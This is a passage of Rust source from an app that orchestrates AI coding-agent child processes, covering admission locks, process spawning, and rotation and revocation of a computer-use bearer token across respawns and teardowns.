            gate
        }
    }
}

pub(crate) fn hidden_receipt_registry_for_key(key: i64) -> Arc<DashSet<i32>> {
    let registries = ENGINE_HIDDEN_RECEIPTS.get_or_init(DashMap::new);
    let stale_keys = registries
        .iter()
        .filter_map(|entry| entry.value().upgrade().is_none().then_some(*entry.key()))
        .collect::<Vec<_>>();
    for stale_key in stale_keys {
        // Recheck under the shard lock: a concurrent constructor may have
        // replaced this dead Weak with a live registry after the scan.
        let _ = registries.remove_if(&stale_key, |_key, weak| weak.upgrade().is_none());
    }
    match registries.entry(key) {
        dashmap::mapref::entry::Entry::Occupied(mut entry) => {
            if let Some(receipts) = entry.get().upgrade() {
                return receipts;
            }
            let receipts = Arc::new(DashSet::new());
            entry.insert(Arc::downgrade(&receipts));
            receipts
        }
        dashmap::mapref::entry::Entry::Vacant(entry) => {
            let receipts = Arc::new(DashSet::new());
            entry.insert(Arc::downgrade(&receipts));
            receipts
        }
    }
}

/// Run one durable enqueue/dispatch linearization point while holding the
/// per-surface serial gate. Commands use this for journal-backed inserts; the
/// visible send keeps an owned guard for its longer Phase-1→spawn admission.
/// Keeping this small helper shared makes barrier tests exercise the exact gate
/// primitive used by production enqueue paths rather than a test-only mutex.
pub(crate) async fn with_admission_gate<T, F, Fut>(key: i64, operation: F) -> T
where
    F: FnOnce() -> Fut,
    Fut: std::future::Future<Output = T>,
{
    let _serial = admission_gate_for_key(key).lock_owned().await;
    operation().await
}

/// All live chat engines, keyed by `-thread_id` (lead) or `session_id` (worker).
///
/// A [`DashMap`] (sharded, lock-free at the map level) rather than a
/// `Mutex<HashMap>`: every accessor returns a cloned [`EngineRef`] (an `Arc`), so
/// there is NO map-wide guard a caller could accidentally hold across an
/// `eng.lock().await` — the audit's #1 fragility (registry guard held across the
/// per-engine async lock) is structurally impossible here. The only rule for
/// callers is the natural one DashMap already enforces: don't keep a per-entry
/// `Ref`/`RefMut` alive across an `.await` (clone the value out and drop it).
#[derive(Default)]
pub struct LeadChatState(pub DashMap<i64, EngineRef>, Arc<tokio::sync::RwLock<()>>);

impl LeadChatState {
    /// Constructors hold a read guard from their durable admission check
    /// through registry insertion/start. Destructive cascades take the write
    /// guard from their key snapshot through post-commit stop, closing the
    /// suspended-constructor window that a DB marker alone cannot fence. While
    /// this write guard is held, callers must use admitted stop/teardown cores;
    /// public wrappers acquire a surface gate and would invert admission order.
    pub async fn engine_admission_read(&self) -> tokio::sync::OwnedRwLockReadGuard<()> {
        self.1.clone().read_owned().await
    }

    pub async fn engine_admission_write(&self) -> tokio::sync::OwnedRwLockWriteGuard<()> {
        self.1.clone().write_owned().await
    }

    pub fn get(&self, key: i64) -> Option<EngineRef> {
        self.0.get(&key).map(|r| r.value().clone())
    }

    pub fn remove(&self, key: i64) -> Option<EngineRef> {
        self.0.remove(&key).map(|r| r.1)
    }

    /// Atomic get-or-insert: concurrent constructors (e.g. React StrictMode's
    /// double-mount firing two ensures) must converge on ONE engine — a lost
    /// race would orphan a duplicate headless process writing the same session.
    /// DashMap's `entry` takes the shard lock for the get-or-insert, so this stays
    /// race-free; the `RefMut` is dropped at the end of the statement.
    pub fn get_or_insert(&self, key: i64, eng: EngineRef) -> EngineRef {
        self.0.entry(key).or_insert(eng).value().clone()
    }

    /// A cached worker is live only while it owns an active turn. An idle
    /// resident process or a failed initial open carries no conversation and
    /// may still follow the current initial-route policy.
    pub fn worker_is_running(&self, session_id: i32) -> bool {
        let Some(engine) = self.get(session_id as i64) else {
            return false;
        };
        let Ok(inner) = engine.try_lock() else {
            // A worker whose state is being changed is conservatively live: a
            // route update must never race an in-flight turn transition.
            return true;
        };
        !inner.stopped && inner.turn.busy
    }

    /// Remove an engine only when the caller still owns the exact cached Arc.
    /// An initial-open failure must not tear down a newer engine that won a
    /// concurrent reconstruction race.
    pub fn remove_if_same(&self, key: i64, expected: &EngineRef) -> Option<EngineRef> {
        self.0
            .remove_if(&key, |_, current| Arc::ptr_eq(current, expected))
            .map(|(_, engine)| engine)
    }
}

/// Serialize a worker's first-route ownership across planner pinning and engine
/// registration. A direction owns one worktree route, so `direction_id` is the
/// right key even before a session row has been created.
pub(crate) fn initial_worker_route_gate(
    direction_id: i32,
) -> std::sync::Arc<tokio::sync::Mutex<()>> {
    static GATES: std::sync::OnceLock<DashMap<i32, std::sync::Arc<tokio::sync::Mutex<()>>>> =
        std::sync::OnceLock::new();
    let gates = GATES.get_or_init(DashMap::new);
    gates
        .entry(direction_id)
        .or_insert_with(|| std::sync::Arc::new(tokio::sync::Mutex::new(())))
        .clone()
}

fn build_args(inner: &EngineInner) -> Vec<String> {
    let mut a: Vec<String> = vec![
        "-p".into(),
        "--input-format".into(),
        "stream-json".into(),
        "--output-format".into(),
        "stream-json".into(),
        "--include-partial-messages".into(),
        "--verbose".into(),
    ];
    if !inner.system_prompt.is_empty() {
        a.push("--append-system-prompt".into());
        a.push(inner.system_prompt.clone());
    }
    if let Some(id) = &inner.native_id {
        a.push("--resume".into());
        a.push(id.clone());
    }
    a.extend(inner.extra_args.iter().cloned());
    // The computer injection rides LAST and comes from its own field — see
    // `EngineInner::computer_args`. Appending here (rather than at
    // construction) is what lets `refresh_computer_injection` replace it
    // before a respawn without any argv surgery.
    a.extend(inner.computer_args.iter().cloned());
    a
}

/// Re-mint this engine's computer-use injection immediately before a child
/// is spawned, replacing [`EngineInner::computer_args`]/`computer_env`.
///
/// Why every respawn needs this: `bus::inject::inject_computer` ROTATES the
/// identity's bearer generation, and every teardown revokes it too
/// (see [`release_child_slot`] / [`revoke_engine_bearer`]). A resident
/// engine respawns from the argv/env captured when it was CONSTRUCTED, so
/// without a refresh the new child would carry a bearer that was already
/// invalidated — every computer call from a resumed session would 401.
/// Refreshing here is what makes revoke-on-stop safe.
///
/// NEVER grants the tool to an engine that didn't already have it. A
/// concierge or curator lead is constructed with both fields empty (see
/// `lead_chat::commands::lead_engine`'s branch), and this returns early on
/// that emptiness rather than consulting thread kind a second time — so the
/// "these two lead kinds never receive computer use" rule can't be
/// re-litigated (or accidentally inverted) here. Same early return when the
/// original injection produced nothing at all (an unwritable `weft_home`,
/// an ACP tool, an unresolved worktree): a session that started without the
/// tool never gains it at a respawn.
///
/// Best-effort by construction: `inject_computer` already falls back to an
/// empty injection rather than erroring. If it does, the fields are left
/// UNCHANGED rather than cleared — a spawn with a stale (possibly revoked)
/// config degrades to 401s on computer calls, whereas clearing them would
/// silently strip a working tool from a session that legitimately had it.
fn refresh_computer_injection(app: &AppHandle, inner: &mut EngineInner) {
    if inner.computer_args.is_empty() && inner.computer_env.is_empty() {
        return;
    }
    let Some(base) = app.try_state::<crate::BusBase>().map(|b| b.0.clone()) else {
        return;
    };
    if base.is_empty() {
        return;
    }
    let fresh = crate::bus::inject::inject_computer(
        &base,
        inner.thread_id,
        &inner.ask_dir,
        &inner.tool,
        inner.worktree_id,
    );
    // Record the ownership stamp BEFORE the empty-injection bail. The mint
    // rotated the identity's generation either way, so the previous stamp is
    // already stale; keeping it would leave this engine able to revoke only a
    // generation that no longer exists, while the one it just created — whose
    // config may well be on disk — becomes unrevocable.
    if fresh.computer_generation.is_some() {
        inner.computer_gen = fresh.computer_generation;
    }
    if fresh.args.is_empty() && fresh.env.is_empty() {
        return;
    }
    inner.computer_args = fresh.args;
    inner.computer_env = fresh.env;
}

/// The env pairs for ONE spawn: the engine's own injections plus the
/// computer injection, deep-merged.
///
/// The merge is not cosmetic. An opencode session's bus config AND its
/// computer config BOTH ride `OPENCODE_CONFIG_CONTENT`, and `Command::envs`
/// is last-wins per key — so handing the two through unmerged silently drops
/// the bus server. `coalesce_env` deep-merges the duplicates (see its own
/// doc). It used to run at construction, when both halves were flattened
/// into `extra_env` together; now that the computer half is replaceable it
/// has to run at ASSEMBLY time instead, or a refreshed computer config would
/// be merged against nothing and clobber the bus entry.
fn spawn_env(inner: &EngineInner) -> Vec<(String, String)> {
    let mut pairs = inner.extra_env.clone();
    pairs.extend(inner.computer_env.iter().cloned());
    crate::bus::inject::coalesce_env(pairs)
}

/// Hand back a dead child's session_gate slot AND kill the computer-use bearer
/// it was launched with, in one step.
///
/// The two belong together, and keeping them together is the point of this
/// helper. `EngineInner::child_permit` already carries an EXHAUSTIVE list of
/// the sites that tear a child down — miss one and the gate slot leaks. Bearer
/// revocation needs that same list for a sharper reason: a generation only
/// rotates at INJECTION, and an engine whose child just died may never inject
/// again, while the session's DB rows keep `session_is_live` true. So a token
/// that leaked out of the injected config/env/argv — to an orphaned descendant,
/// or to any same-uid process that read it — stays valid indefinitely and can
/// go on driving the desktop under a standing Full/Always grant. Two lists that
/// must stay identical inevitably drift; one call site each cannot.
///
/// Use at every teardown that does NOT immediately respawn. The two respawn
/// overwrites (`ensure_running_locked`, `spawn_turn`) release the stale permit
/// and mint a fresh injection inside the same critical section; that mint
/// rotates the generation itself, so the dead child's bearer dies there without
/// an explicit revoke — and revoking after the mint would kill the token the
/// NEW child is about to carry. That is why those two sites clear the permit
/// inline instead of calling this.
///
/// Callers that sit behind an ownership guard (`turn_id`/`busy`, or a reader's
/// `generation`) must keep this inside the guard, exactly as the bare permit
/// release had to be: a stale caller revoking would strip a NEWER child's live
/// bearer, and unlike a wrongly-released permit that failure is user-visible —
/// every computer call from a healthy session starts 401ing.
///
/// Free for engines that never had the tool (concierge/curator leads, workers
/// with an unresolved worktree): revoking an identity that never minted is a
/// no-op bump, so teardown paths stay uniform instead of re-deriving who was
/// eligible.
fn release_child_slot(inner: &mut EngineInner) {
    inner.child_permit = None;
    // A LIVE app-server client is the holder of this engine's bearer, and a
    // child teardown does not destroy it — `spawn_codex_turn`'s reuse arm hands
    // the next turn that same client WITHOUT refreshing its injection, so
    // revoking here would 401 a connection that is about to be used again.
    // Every path that genuinely ends the client takes it out of this field
    // first (`stop_quiet`, both exec fallbacks) or revokes at the client's own
    // death site (`codex_consumer`), so the revoke is never merely deferred.
    if inner.codex_client.is_some() {
        return;
    }
    revoke_engine_bearer(inner);
}

/// Revoke the bearer THIS engine minted — and only if it is still the current
/// one for the identity.
///
/// Consumes the record: [`EngineInner::computer_gen`] is taken, so a second
/// call before the next mint is a no-op. That makes it safe to revoke
/// defensively (early AND late around an unlocked teardown, say) without a
/// second revoke landing on a generation someone else minted in between.
///
/// Also the bearer half of [`release_child_slot`] for the process this engine
/// owns that is NOT `inner.child`: the codex app-server. That client spawns and
/// owns its own child, so it holds no `child_permit`, never passes through
/// `spawn_reader`, and its death is not a teardown site in `child_permit`'s
/// enumeration — the reason it needs saying separately. The rule is the same
/// one: whenever THIS engine's app-server is shut down or found disconnected,
/// the bearer it was launched with dies with it, because nothing else will
/// rotate that generation until the next injection, which may never come.
///
/// `cleanup_disconnected_turn` is not sufficient on its own even though it
/// routes through `release_child_slot`: it early-returns on an already-idle
/// engine, and an app-server that dies BETWEEN turns — the ordinary case for a
/// resident client nothing reconnects — is exactly that shape.
///
/// Call it only for a client this engine still owns (`ptr_eq`, or an explicit
/// `take`). An exec fallback that deliberately replaces the client may call it
/// too: `spawn_turn` re-mints immediately afterwards, so the new child still
/// starts live.
/// Guard a fallible step that sits BETWEEN a mint and the child being alive: on
/// failure, revoke the bearer `refresh_computer_injection` just minted.
///
/// Every spawn path re-mints immediately before launching, which rotates the
/// identity's generation and writes the new bearer wherever that tool reads it
/// (claude's `.mcp.json`, codex's env, opencode's inline config). If the launch
/// then fails — the cwd vanished, the binary lost its execute bit, the host is
/// out of process slots, the adapter refused the argv — that bearer is current
/// and valid but belongs to a child that will never exist. Nothing later
/// necessarily rotates it: the engine just sits there, its DB rows keep
/// `session_is_live` true, and the next teardown may never come.
///
/// Local to the spawn rather than left to the caller's rollback on purpose:
/// which rollback runs (if any) depends on how the spawn was reached, and that
/// is exactly the kind of coupling this file has already been bitten by.
fn revoke_if_spawn_failed<T, E>(inner: &mut EngineInner, r: Result<T, E>) -> Result<T, E> {
    if r.is_err() {
        revoke_engine_bearer(inner);
    }
    r
}

fn revoke_engine_bearer(inner: &mut EngineInner) {
    let Some(generation) = inner.computer_gen.take() else {
        return;
    };
    crate::bus::computer_srv::revoke_computer_session_token_generation(
        inner.thread_id,
        &inner.ask_dir,
        inner.worktree_id,
        generation,
    );
}

fn merge_init_slash_commands(
    existing: &[super::proto::SlashCmd],
    init: Vec<super::proto::SlashCmd>,
) -> Vec<super::proto::SlashCmd> {
    if init.is_empty() {
        return existing.to_vec();
    }
    if existing.is_empty() {
        return init;
    }

    let by_name: HashMap<&str, &super::proto::SlashCmd> =
        existing.iter().map(|c| (c.name.as_str(), c)).collect();
    init.into_iter()
        .map(|mut incoming| {
            if let Some(old) = by_name.get(incoming.name.as_str()) {
                if incoming
                    .description
                    .as_deref()
                    .unwrap_or_default()
                    .is_empty()
                {
                    incoming.description = old.description.clone();
                }
                if incoming.arg_hint.as_deref().unwrap_or_default().is_empty() {
                    incoming.arg_hint = old.arg_hint.clone();
                }
            }
            incoming
        })
        .collect()
}

/// Spawn the resident process if it isn't alive, under the CALLER's already-held
/// lock. Returns the new child's stdout + generation when a process was spawned
/// (the caller must `spawn_reader` after it drops the lock), or `None` when no
/// spawn was needed (stopped, per-turn, or already alive). Keeping the spawn
/// under one continuous lock lets a caller reserve a turn slot atomically with
/// ensuring the process — no window for a racing send to slip a turn in.
async fn ensure_running_locked(
    app: &AppHandle,
    inner: &mut EngineInner,
) -> anyhow::Result<Option<(tokio::process::ChildStdout, u64, String)>> {
    if inner.stopped {
        return Ok(None);
    }
    if per_turn(&inner.tool) || is_acp_tool(&inner.tool) {
        // Per-turn and ACP connection tools have no resident child to keep
        // alive here — turns are driven by spawn_turn / spawn_acp_turn.
        return Ok(None);
    }
    if inner.tool != "claude" {
        anyhow::bail!("unknown lead tool {}", inner.tool);
    }
    if let Some(c) = inner.child.as_mut() {
        if c.try_wait().ok().flatten().is_none() {
            return Ok(None); // alive
        }
    }
    crate::process_quota::admit_new_work(app)?;
    // A resident engine respawns from the argv/env it was CONSTRUCTED with,
    // so the computer bearer in there may already have been revoked by a
    // Stop. Re-mint it here, immediately before the spawn, so
    // the new child starts with a live one.
    refresh_computer_injection(app, inner);
    crate::claude::ensure_trusted(&inner.cwd);
    // Resolve the actual binary: a per-session pin, else the global override for
    // "claude" (e.g. a user-aliased `cc-claude`), else "claude" itself.
    let program = crate::tool_command::effective(inner.command.as_deref(), &inner.tool);
    let owner = match inner.session_id {
        Some(s) => crate::proc_registry::Owner::session(s.to_string()),
        None => crate::proc_registry::Owner::lead_thread(inner.thread_id.to_string()),
    };
    let mut command = Command::new(&program);
    command
        .args(build_args(inner))
        .current_dir(&inner.cwd)
        .env("PATH", crate::detect::tool_path())
        // injection-supplied env (the codex computer
        // bearer travels here, never argv — see `EngineInner::extra_env`).
        // `spawn_env` (not `extra_env` directly) — it appends the
        // computer injection and deep-merges the shared
        // OPENCODE_CONFIG_CONTENT key; see its own doc.
        .envs(spawn_env(inner).iter().map(|(k, v)| (k.clone(), v.clone())))
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true);
    // 先还旧槽,再排队要新的。走到这里 `child` 要么是 None、要么已被上面的
    // try_wait 判定为死进程,它的 permit 是陈的;若留着不放就去 await 新槽,gate
    // 打满时这个会话会卡在等一个它自己占着的槽上(自锁),得等别的会话结束才解开。
    //
    // 裸释放,不走 `release_child_slot`:上面的 `refresh_computer_injection`
    // 已经重铸并轮转过 generation(死进程的 bearer 就此作废),而 command 也已
    // 用新 env 建好;此处再撤销会把新子进程即将带走的令牌一起打掉。见该 helper 文档。
    inner.child_permit = None;
    // 活跃会话软上限:拿一个会话槽,已满则在此排队等某个在跑的会话结束(与上面
    // admit_new_work 的总进程数硬闸互补——那个拒绝、这个排队,不丢会话)。
    let session_permit = crate::session_gate::acquire_session_slot().await;
    // T1: own process group + marker before spawn, register PAIRED with the child.
    let configured = crate::proc_registry::configure(&mut command, owner);
    let spawned = command.spawn();
    let mut child = revoke_if_spawn_failed(inner, spawned)?;
    let reg = configured.register(&child);
    inner.stdin = child.stdin.take();
    // Ask for the command list NOW: the init system message only ships with the
    // first user turn, so the palette would stay empty until the human speaks.
    if let Some(stdin) = inner.stdin.as_mut() {
        let req = serde_json::json!({
            "type": "control_request",
            "request_id": "weft-initialize",
            "request": { "subtype": "initialize" }
        });
        let _ = stdin.write_all(format!("{req}\n").as_bytes()).await;
        let _ = stdin.flush().await;
    }
    let piped = child
        .stdout
        .take()
        .ok_or_else(|| anyhow::anyhow!("child stdout not piped"));
    let stdout = revoke_if_spawn_failed(inner, piped)?;
    inner.child = Some(child);
    inner.child_reg = Some(reg);
    // permit 与 child_reg 同寿:child 被 take/overwrite/stop 清掉时一并 drop=释放槽。
    inner.child_permit = session_permit;
    inner.generation += 1;
    inner.turn = TurnState::default();
    inner.clock = TurnClock::default();
    inner.turn_user_row = None;
    // A prior hidden activity receipt may still be waiting on the admission
    // gate while the resident is respawned; its token remains authoritative.
    inner.current = None;
    inner.interrupting = false;
    Ok(Some((stdout, inner.generation, program)))
}

/// Ensure an idle, non-stopped resident is available for a durable hidden
/// delivery. This deliberately does not clear `stopped`: only explicit visible
/// input or a guarded plan approval may do that. Per-turn and ACP engines return
/// `None` here because their hidden delivery path starts a turn instead.
async fn ensure_active_resident_locked(
    app: &AppHandle,
    inner: &mut EngineInner,
) -> anyhow::Result<Option<(tokio::process::ChildStdout, u64, String)>> {
    if inner.stopped {
        return Ok(None);
    }
    ensure_running_locked(app, inner).await
}

/// Spawn the process if it isn't alive (fresh or `--resume`), wiring the reader.
/// Per-turn dialects have no resident process — sending spawns one per turn.
pub(crate) async fn ensure_worker_parent_chain(
    db: &Db,
    direction_id: i32,
    session_repo_id: i32,
) -> anyhow::Result<crate::store::entities::direction::Model> {
    let direction = repo::ensure_direction_workspace_accepts_writes(db, direction_id).await?;
    let thread = repo::ensure_thread_workspace_accepts_writes(db, direction.thread_id).await?;
    let primary_repo = repo::ensure_repo_workspace_accepts_writes(db, direction.repo_id).await?;
    let session_repo = repo::ensure_repo_workspace_accepts_writes(db, session_repo_id).await?;
    if primary_repo.workspace_id != thread.workspace_id {
        anyhow::bail!(
            "direction {direction_id} repo {} does not belong to thread {}'s workspace",
            primary_repo.id,
            thread.id
        );
    }
    if session_repo.workspace_id != thread.workspace_id {
        anyhow::bail!(
            "session repo {} does not belong to thread {}'s workspace",
            session_repo.id,
            thread.id
        );
    }
    Ok(direction)
}

async fn validate_registered_engine_identity(
    state: Option<&LeadChatState>,
    db: &Db,
    eng: &EngineRef,
    thread_id: i32,
    session_id: Option<i32>,
    direction_scope: &str,
) -> anyhow::Result<()> {
    if let Some(state) = state {
        let key = session_id
            .map(i64::from)
            .unwrap_or_else(|| super::commands::lead_key(thread_id));
        let registered = state
            .get(key)
            .is_some_and(|registered| Arc::ptr_eq(&registered, eng));
        if !registered {
            anyhow::bail!("engine is no longer registered");
        }
    }
    repo::ensure_thread_workspace_accepts_writes(db, thread_id).await?;
    let Some(session_id) = session_id else {
        if direction_scope != crate::bus::LEAD {
            anyhow::bail!("invalid lead engine identity");
        }
        return Ok(());
    };

    let direction_id = direction_scope
        .parse::<i32>()
        .map_err(|_| anyhow::anyhow!("invalid worker direction identity"))?;
    let session = repo::get_session(db, session_id)
        .await?
        .ok_or_else(|| anyhow::anyhow!("session {session_id} no longer exists"))?;
    if session.direction_id != direction_id {
        anyhow::bail!("session {session_id} no longer belongs to direction {direction_id}");
    }
    let direction = ensure_worker_parent_chain(db, direction_id, session.repo_id).await?;
    if direction.thread_id != thread_id {
        anyhow::bail!("direction {direction_id} no longer belongs to thread {thread_id}");
    }
    Ok(())
}

pub(crate) struct EngineAdmissionGuard {
    _serial: tokio::sync::OwnedMutexGuard<()>,
    _global: Option<tokio::sync::OwnedRwLockReadGuard<()>>,
}

async fn engine_admission_guard(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
) -> anyhow::Result<EngineAdmissionGuard> {
    let key = {
        let inner = eng.lock().await;
        inner
            .session_id
            .map(i64::from)
            .unwrap_or_else(|| super::commands::lead_key(inner.thread_id))
    };
    // Lock order is deliberate: per-surface serial gate first, global engine
    // admission read second. We do not hold the engine mutex while waiting on
    // either gate, so a delete writer or stop path cannot form a cycle.
    let serial = admission_gate_for_key(key).lock_owned().await;
    let state = app.try_state::<LeadChatState>();
    let global = if let Some(state) = state.as_ref() {
        Some(state.engine_admission_read().await)
    } else {
        None
    };
    let (thread_id, session_id, direction_scope) = {
        let inner = eng.lock().await;
        (inner.thread_id, inner.session_id, inner.ask_dir.clone())
    };
    validate_registered_engine_identity(
        state.as_deref(),
        db,
        eng,
        thread_id,
        session_id,
        &direction_scope,
    )
    .await?;
    Ok(EngineAdmissionGuard {
        _serial: serial,
        _global: global,
    })
}

async fn ensure_running_admitted(app: &AppHandle, db: &Db, eng: &EngineRef) -> anyhow::Result<()> {
    let mut inner = eng.lock().await;
    let reader = ensure_running_locked(app, &mut inner).await?;
    drop(inner);
    if let Some((stdout, generation, quota_command)) = reader {
        spawn_reader(
            app.clone(),
            db.clone(),
            eng.clone(),
            stdout,
            generation,
            quota_command,
        );
    }
    Ok(())
}

pub async fn ensure_running(app: &AppHandle, db: &Db, eng: &EngineRef) -> anyhow::Result<()> {
    let _admission = engine_admission_guard(app, db, eng).await?;
    ensure_running_admitted(app, db, eng).await
}

async fn ensure_running_for_send_admitted(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
) -> anyhow::Result<()> {
    eng.lock().await.stopped = false;
    ensure_running_admitted(app, db, eng).await
}

/// Build the exact prompt carried by one durable hidden row. Durable rows are
/// restricted to the two stable source kinds, so the source kind (rather than
/// caller-supplied payload fields) remains the protocol tag used on the wire.
/// Keeping this formatter in the engine lets visible-send pre-admission and
/// background/retry replay share one representation.
pub(crate) fn durable_hidden_delivery_text(
    row: &crate::store::entities::lead_hidden_delivery::Model,
) -> anyhow::Result<String> {
    if !matches!(row.source_kind.as_str(), "plan_decision" | "repo_action") {
        anyhow::bail!("unsupported durable hidden delivery kind {}", row.source_kind);
    }
    let payload: serde_json::Value = serde_json::from_str(&row.payload)
        .map_err(|error| anyhow::anyhow!("invalid hidden lead delivery payload: {error}"))?;
    let json = serde_json::to_string(&payload)?;
    Ok(format!(
        "<weft:{}>{json}</weft:{}>",
        row.source_kind, row.source_kind
    ))
}

/// Read the authoritative pending hidden rows at a visible-send admission
/// boundary. Callers must hold the engine mutex (and the per-surface admission
/// gate) while awaiting this helper; the returned rows are only a validated
/// snapshot, so the caller still performs one final `get_by_id` recheck before
/// each reservation. Keeping the DB read/format step in a production helper
/// gives tests a seam that exercises the same pending-row path as `send`.
async fn pending_hidden_rows_at_admission(
    db: &Db,
    inner: &EngineInner,
) -> anyhow::Result<Vec<(
    crate::store::entities::lead_hidden_delivery::Model,
    String,
)>> {
    let rows = repo::list_pending_lead_hidden_deliveries(db, Some(inner.thread_id)).await?;
    let mut prepared = Vec::with_capacity(rows.len());
    for row in rows {
        let Some(current) = repo::get_lead_hidden_delivery(db, row.id).await? else {
            continue;
        };
        if current.state != repo::LEAD_HIDDEN_DELIVERY_PENDING {
            continue;
        }
        let text = durable_hidden_delivery_text(&current)?;
        prepared.push((current, text));
    }
    Ok(prepared)
}

/// Spawn the first per-turn/connection hidden delivery after its turn slot has
/// been reserved under the engine mutex. The reservation stays ahead of every
/// later visible send; callers roll it back on an actual spawn failure.
async fn spawn_hidden_turn_after_admission(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    out: Outgoing,
    expected_epoch: u64,
) -> anyhow::Result<()> {
    let (codex_appserver, acp) = {
        let inner = eng.lock().await;
        (
            inner.tool == "codex" && codex_appserver_enabled(),
            is_acp_tool(&inner.tool),
        )
    };
    if codex_appserver {
        spawn_codex_turn_or_exec(
            app.clone(),
            db.clone(),
            eng.clone(),
            out,
            Some(expected_epoch),
        )
        .await
    } else if acp {
        spawn_acp_turn(
            app.clone(),
            db.clone(),
            eng.clone(),
            out,
            Some(expected_epoch),
        )
        .await
    } else {
        spawn_turn(
            app.clone(),
            db.clone(),
            eng.clone(),
            out,
            Some(expected_epoch),
        )
        .await
    }
}

/// Restore a stopped engine only when the failed batch still owns the same
/// reset epoch. A concurrent reset/restart is authoritative and must not be
/// overwritten by a stale rollback after its spawn/write await completes.
async fn restore_stopped_after_failed_batch(
    db: &Db,
    eng: &EngineRef,
    was_stopped: bool,
    initial_epoch: u64,
) {
    if !was_stopped {
        return;
    }
    let status = {
        let mut inner = eng.lock().await;
        if inner.reset_epoch != initial_epoch {
            return;
        }
        inner.stopped = true;
        (inner.session_id, inner.thread_id)
    };
    persist_activity(db, status.0, status.1, STATUS_STOPPED).await;
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum DurableResumeAuthorization {
    Background,
    Visible,
}

fn durable_batch_may_resume(
    prepared: &[(crate::store::entities::lead_hidden_delivery::Model, String)],
    authorization: DurableResumeAuthorization,
) -> bool {
    authorization == DurableResumeAuthorization::Visible
        || prepared
            .iter()
            .any(|(row, _)| row.source_kind == "plan_decision")
}

/// Admit every pending durable hidden row in one ordered batch. The caller
/// either already owns the per-surface admission guard (`Visible`) or this
/// function acquires it (`Background`). A pending plan decision is itself an
/// explicit persisted resume authorization, so a stopped batch containing one
/// may clear `stopped` once before dispatching all rows in ID order.
///
/// No row after a failed resident write or per-turn/connection spawn is
/// reserved: the first spawn is completed before the next row is queued.
/// `note_turn_activity` remains the sole transition to delivered/consumed.
pub(crate) async fn admit_pending_durable_batch_existing(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
) -> anyhow::Result<bool> {
    let _admission = engine_admission_guard(app, db, eng).await?;
    admit_pending_durable_batch_admitted(
        app,
        db,
        eng,
        DurableResumeAuthorization::Background,
    )
    .await
}

async fn admit_pending_durable_hidden_for_visible(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
) -> anyhow::Result<()> {
    let _ = admit_pending_durable_batch_admitted(
        app,
        db,
        eng,
        DurableResumeAuthorization::Visible,
    )
    .await?;
    Ok(())
}

/// Core batch admission. `send` holds the per-surface gate before calling this
/// function; background/live hydration uses the public wrapper above.
async fn admit_pending_durable_batch_admitted(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    authorization: DurableResumeAuthorization,
) -> anyhow::Result<bool> {
    let mut inner = eng.lock().await;
    if inner.tearing_down {
        anyhow::bail!("engine is tearing down");
    }
    if inner.rewinding {
        anyhow::bail!("会话正在回退，请稍后重试");
    }
    // Validate and format every row before mutating engine state. This makes a
    // malformed later row fail the whole batch without dispatching an earlier
    // row or clearing stopped as an accidental side effect.
    let prepared = pending_hidden_rows_at_admission(db, &inner).await?;
    if prepared.is_empty() {
        return Ok(false);
    }
    let may_resume = durable_batch_may_resume(&prepared, authorization);
    if inner.stopped && !may_resume {
        return Ok(false);
    }

    let was_stopped = inner.stopped;
    let initial_epoch = inner.reset_epoch;
    if may_resume {
        inner.stopped = false;
    }
    let mut admitted = false;

    for (snapshot, _) in prepared {
        // The durable state is authoritative at the actual reservation point.
        let Some(row) = repo::get_lead_hidden_delivery(db, snapshot.id).await? else {
            continue;
        };
        if row.state != repo::LEAD_HIDDEN_DELIVERY_PENDING {
            continue;
        }
        let text = durable_hidden_delivery_text(&row)?;
        if hidden_delivery_is_duplicate(&inner, row.id) {
            admitted = true;
            continue;
        }

        let mut delivery = hidden_delivery(
            &inner.tool,
            inner.turn.busy,
            inner.stdin.is_some(),
            inner.stopped,
        );
        if should_ensure_active_resident(&inner, true, Some(row.id))
            && !inner.turn.busy
            && !per_turn(&inner.tool)
            && !is_acp_tool(&inner.tool)
        {
            let reader = match ensure_active_resident_locked(app, &mut inner).await {
                Ok(reader) => reader,
                Err(error) => {
                    if was_stopped && inner.reset_epoch == initial_epoch {
                        inner.stopped = true;
                    }
                    return Err(error);
                }
            };
            if let Some((stdout, generation, quota_command)) = reader {
                spawn_reader(
                    app.clone(),
                    db.clone(),
                    eng.clone(),
                    stdout,
                    generation,
                    quota_command,
                );
            }
            delivery = hidden_delivery(
                &inner.tool,
                inner.turn.busy,
                inner.stdin.is_some(),
                inner.stopped,
            );
        }

        let out = Outgoing {
            text,
            images: vec![],
            tracked: false,
            origin_tag: Some(hidden_delivery_tag(row.id)),
            queue_id: None,
            has_attachments: false,
            local_image_paths: vec![],
        };
        match delivery {
            HiddenDelivery::Noop => {
                if was_stopped && inner.reset_epoch == initial_epoch {
                    inner.stopped = true;
                }
                anyhow::bail!("durable hidden delivery {} is not admissible", row.id);
            }
            HiddenDelivery::Queue => {
                queue_hidden_delivery(app, &mut inner, out);
                admitted = true;
            }
            HiddenDelivery::WriteResident => {
                let turn_id = begin_hidden_turn(app, db, &mut inner, Some(row.id)).await;
                if let Err(error) = write_user(&mut inner, &out).await {
                    drop(inner);
                    rollback_failed_turn(app, db, eng, turn_id, "error").await;
                    restore_stopped_after_failed_batch(db, eng, was_stopped, initial_epoch).await;
                    return Err(error);
                }
                admitted = true;
            }
            HiddenDelivery::SpawnTurn => {
                let turn_id = begin_hidden_turn(app, db, &mut inner, Some(row.id)).await;
                let reset_epoch = inner.reset_epoch;
                drop(inner);
                if let Err(error) = spawn_hidden_turn_after_admission(
                    app,
                    db,
                    eng,
                    out,
                    reset_epoch,
                )
                .await
                {
                    rollback_failed_turn(app, db, eng, turn_id, "error").await;
                    restore_stopped_after_failed_batch(db, eng, was_stopped, initial_epoch).await;
                    return Err(error);
                }
                admitted = true;
                inner = eng.lock().await;
            }
        }
    }

    drop(inner);
    Ok(admitted)
}

/// Drop the resident child and its stdin so the next send respawns a clean
/// process. Used when a write fails or times out mid-line: a partial JSON
